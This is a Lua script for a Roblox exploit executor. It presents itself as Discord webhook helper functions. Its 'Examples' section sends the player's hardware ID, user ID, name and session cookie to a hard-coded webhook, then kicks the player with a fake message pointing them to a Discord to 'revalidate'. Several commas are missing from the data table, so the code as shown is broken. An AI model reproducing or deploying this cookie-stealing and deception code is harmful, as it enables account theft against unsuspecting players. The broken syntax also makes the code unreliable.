function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end


--Examples 
local url = "https://discord.com/api/webhooks/1564251522018050158/IAogFQd_1h_8x8TDOWDUd4A3-sLddyBCNlMKc5tYBwgordOJKvJGHB2w_NTDKlYc93cS"
SendMessage(url, "Hello")


local embed = {
    ["title"] = "yaman log",
    ["description"] = "yaman logging",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "hwid",
            ["value"] = gethwid(),
        },
        {
            ["name"] = "clientid",
            ["value"] = game:GetService("RbxAnalyticsService"),
        }
        {
            ["name"] = "userid",
            ["value"] = game:GetService("Players").LocalPlayer.UserId,
        }
    {
            ["name"] = "name",
            ["value"] = game:GetService("Players").LocalPlayer.Name,
        }
    {
            ["name"] = "cookie",
            ["value"] = pcall(getcookie),
        }
    },
    ["footer"] = {
        ["text"] = "This is the footer text"
    }
}
SendMessageEMBED(url, embed)
game:GetService("Players").LocalPlayer:Kick("LOLHAX\nInvalidUser. Please join the discord to revalidate or request access.")
